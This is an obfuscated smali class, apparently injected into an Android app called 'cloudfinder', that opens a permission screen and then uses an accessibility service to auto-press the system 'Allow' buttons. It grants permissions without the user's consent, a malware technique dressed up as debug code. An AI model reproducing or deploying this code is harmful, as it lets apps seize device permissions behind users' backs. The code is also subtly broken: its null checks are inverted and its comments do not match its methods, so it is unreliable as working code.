.class public final Lڝږ؁ڋ/ھ;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;

# 调试流水线：
#   isDebug(ctx)         inject_state.debug_mode（默认 true）
#   startPerm(ctx)       2 秒后拉起 PermissionActivity
#   scheduleClick(ctx)   2 秒后通过无障碍服务点“允许”
# step 0 = 拉权限页；step 1 = 点击

.field private static handler:Landroid/os/Handler;
.field private final ctx:Landroid/content/Context;
.field private final step:I

.field private static started:Z

.method static constructor <clinit>()V
    .locals 2
    new-instance v0, Landroid/os/Handler;
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;
    move-result-object v1
    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V
    sput-object v0, Lڝږ؁ڋ/ھ;->handler:Landroid/os/Handler;
    return-void
.end method

.method public constructor <init>(Landroid/content/Context;I)V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    iput-object p1, p0, Lڝږ؁ڋ/ھ;->ctx:Landroid/content/Context;
    iput p2, p0, Lڝږ؁ڋ/ھ;->step:I
    return-void
.end method

.method public static isDebug(Landroid/content/Context;)Z
    .locals 3
    :try_start_0
    const-string v0, "inject_state"
    const/4 v1, 0x0
    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    move-result-object v0
    const-string v1, "debug_mode"
    const/4 v2, 0x1
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return v0
    :catch_0
    move-exception v0
    const/4 v0, 0x1
    return v0
.end method

.method public static startPerm(Landroid/content/Context;)V
    .locals 4
    sget-boolean v0, Lڝږ؁ڋ/ھ;->started:Z
    if-eqz v0, :skip
    const-string v0, "PermDebug"
    const-string v1, "startPerm skipped (already started)"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    return-void
    :skip
    const/4 v0, 0x1
    sput-boolean v0, Lڝږ؁ڋ/ھ;->started:Z
    const-string v0, "PermDebug"
    const-string v1, "startPerm enter"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_start_0
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/lite/cloudfinder/activity/PermissionActivity;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    const/high16 v1, 0x10000000
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    const-string v0, "PermDebug"
    const-string v1, "startPerm started OK"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return-void
    :catch_0
    move-exception v0
    const-string v1, "PermDebug"
    const-string v2, "startPerm failed"
    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    return-void
.end method

.method public static delayedClick(Landroid/content/Context;)V
    .locals 4
    const-string v0, "PermDebug"
    const-string v1, "delayedClick armed 2s"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_start_0
    new-instance v0, Landroid/os/Handler;
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;
    move-result-object v1
    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V
    new-instance v1, Lڝږ؁ڋ/ھ;
    const/4 v2, 0x1
    invoke-direct {v1, p0, v2}, Lڝږ؁ڋ/ھ;-><init>(Landroid/content/Context;I)V
    const-wide/16 v2, 0x7d0
    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return-void
    :catch_0
    move-exception v0
    return-void
.end method

.method public static scheduleClick(Landroid/content/Context;)V
    .locals 8
    const-string v0, "PermDebug"
    const-string v1, "scheduleClick enter"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_start_0
    sget-object v1, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;
    if-nez v1, :done
    invoke-virtual {v1}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;
    move-result-object v2
    if-nez v2, :done
    const/4 v3, 0x4
    new-array v3, v3, [Ljava/lang/String;
    const/4 v4, 0x0
    const-string v5, "com.android.permissioncontroller:id/permission_allow_all_button"
    aput-object v5, v3, v4
    const/4 v4, 0x1
    const-string v5, "com.android.permissioncontroller:id/permission_allow_button"
    aput-object v5, v3, v4
    const/4 v4, 0x2
    const-string v5, "com.google.android.permissioncontroller:id/permission_allow_all_button"
    aput-object v5, v3, v4
    const/4 v4, 0x3
    const-string v5, "com.google.android.permissioncontroller:id/permission_allow_button"
    aput-object v5, v3, v4
    const/4 v4, 0x0
    :loop
    array-length v5, v3
    if-ge v4, v5, :done
    aget-object v5, v3, v4
    invoke-virtual {v2, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;
    move-result-object v5
    if-eqz v5, :next
    invoke-interface {v5}, Ljava/util/List;->isEmpty()Z
    move-result v6
    if-nez v6, :next
    const/4 v6, 0x0
    invoke-interface {v5, v6}, Ljava/util/List;->get(I)Ljava/lang/Object;
    move-result-object v5
    check-cast v5, Landroid/view/accessibility/AccessibilityNodeInfo;
    const/16 v6, 0x10
    invoke-virtual {v5, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    const-string v6, "PermDebug"
    const-string v7, "click allow"
    invoke-static {v6, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    goto :done
    :next
    add-int/lit8 v4, v4, 0x1
    goto :loop
    :done
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return-void
    :catch_0
    move-exception v0
    const-string v1, "PermDebug"
    const-string v2, "click failed"
    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    return-void
.end method

.method public run()V
    .locals 2
    :try_start_0
    iget-object v0, p0, Lڝږ؁ڋ/ھ;->ctx:Landroid/content/Context;
    if-nez v0, :done
    invoke-static {v0}, Lڝږ؁ڋ/ھ;->scheduleClick(Landroid/content/Context;)V
    :done
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return-void
    :catch_0
    move-exception v0
    return-void
.end method
